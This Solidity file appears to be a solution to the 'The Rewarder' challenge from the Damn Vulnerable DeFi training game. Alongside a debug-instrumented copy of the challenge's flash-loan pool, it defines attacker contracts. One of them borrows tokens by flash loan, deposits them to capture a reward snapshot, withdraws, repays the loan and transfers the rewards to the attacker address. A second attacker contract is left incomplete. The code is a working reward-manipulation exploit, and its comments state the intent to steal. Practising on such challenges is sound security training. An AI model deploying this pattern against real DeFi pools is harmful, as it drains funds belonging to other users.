// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";

import "hardhat/console.sol";

contract TheRewarderPoolAttacker {
    address public attacker;
    DamnValuableToken public damnValuableToken;
    FlashLoanerPool private flashLoanpool;
    TheRewarderPool private rewarderPool;
    RewardToken public rewardToken;
    AccountingToken public accountingToken;

    constructor (
        address attackerAddress,
        address liquidityTokenAddress,
        address flashLoanPoolAddress,
        address rewarderPoolAddress,
        address rewardTokenAddress,
        address accountingTokenAddress
    ) {
        attacker = attackerAddress;
        damnValuableToken = DamnValuableToken(liquidityTokenAddress);
        flashLoanpool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        accountingToken = AccountingToken(accountingTokenAddress);
    }

    function attack (uint amount) public {
        console.log('ATACK');
        flashLoanpool.flashLoan(amount);
    }

    // Take a flash loan of DVT, deposit to rewarder pool, call distributeRewards and collect reward, withdraw DVT
    // send reward token to the attacker, return DVT


    receive() external payable {}

    // receive
    // fallback
}

contract RewarderAttacker {
    address public attacker;
    DamnValuableToken public immutable damnValuableToken;
    FlashLoanerPool private immutable flashLoanpool;
    TheRewarderPool private immutable rewarderPool;
    RewardToken public immutable rewardToken;
    AccountingToken public accountingToken;

    constructor (
        address attackerAddress, 
        address tokenAddress, 
        address flashLoanPoolAddress, 
        address rewarderPoolAddress, 
        address rewardTokenAddress,
        address accountingTokenAddress
    ) {
        damnValuableToken = DamnValuableToken(tokenAddress);
        flashLoanpool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        accountingToken = AccountingToken(accountingTokenAddress);
        attacker = attackerAddress;
    }

    function attack(uint256 amount) external {
        flashLoanpool.flashLoan(amount);
    }

    // Take a flash loan of DVT, deposit to rewarder pool, call distributeRewards and collect reward, withdraw DVT
    // send reward token to the attacker, return DVT
    function receiveFlashLoan(uint256 amount) external {
        console.log('??catch receiveFlashLoan??');
        damnValuableToken.approve(address(rewarderPool), amount);
        /**
            * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
        */
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        // return to pass require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
        damnValuableToken.transfer(msg.sender, amount);
        // спиздить
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));

    }

    receive() external payable {}
}


/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        console.log('flashLoan');
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );
        console.log('liquidityToken.balanceOf(address(this))', liquidityToken.balanceOf(address(this)));
        console.log('balanceBefore', balanceBefore);
        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}